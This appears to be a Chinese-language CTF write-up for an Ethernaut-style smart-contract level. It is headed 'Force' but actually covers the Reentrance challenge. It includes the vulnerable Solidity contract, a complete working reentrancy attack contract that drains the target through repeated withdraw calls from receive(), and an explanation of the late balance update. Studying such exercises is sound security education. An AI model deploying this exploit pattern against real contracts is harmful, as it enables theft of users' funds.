# 07 - Force

## 题目
这一关的目标是偷走合约的所有资产.

这些可能有帮助:

不可信的合约可以在你意料之外的地方执行代码.
Fallback methods
抛出/恢复 bubbling
有的时候攻击一个合约的最好方式是使用另一个合约.
查看上方帮助页面, "Beyond the console" 部分
```
// SPDX-License-Identifier: MIT

pragma solidity ^0.6.12;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Reentrance {
using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
```

## 解题
本题考察重入攻击，破解合约如下
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 目标合约的接口
interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

// 攻击合约
contract ReentranceAttack {
    address public owner;
    IReentrance public targetContract;
    uint public constant TARGET_VALUE = 1000000000000000 wei; // 0.001 ether

    constructor(address _targetAddr) {
        targetContract = IReentrance(_targetAddr);
        owner = msg.sender;
    }

    // 攻击函数
    function attack() external payable {
        require(msg.value >= TARGET_VALUE, "Not enough ETH sent");

        // 首先向目标合约捐款
        targetContract.donate{value: TARGET_VALUE}(address(this));

        // 然后立即提取
        targetContract.withdraw(TARGET_VALUE);
    }

    // 提取攻击合约中的所有资金
    function withdrawAll() external {
        require(msg.sender == owner, "Not the owner");
        uint balance = address(this).balance;
        (bool success, ) = owner.call{value: balance}("");
        require(success, "Withdrawal failed");
    }

    // 接收函数，用于重入攻击
    receive() external payable {
        uint targetBalance = address(targetContract).balance;
        if (targetBalance >= TARGET_VALUE) {
            targetContract.withdraw(TARGET_VALUE);
        }
    }
}
```

attack 函数在 denote 后立即激活 withdraw, 
由于被攻击合约以下代码的漏洞：
```            
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
 ```
导致在资金已经发送给攻击合约后，才将 balances 减少，但被返回的资金又激活了攻击合约的 receive 函数，
receive 函数中又再次调用 withdraw 函数，
这个调用直到 targetBalance < TARGET_VALUE 时才会停止，此时已经掏空了被攻击合约的资金。

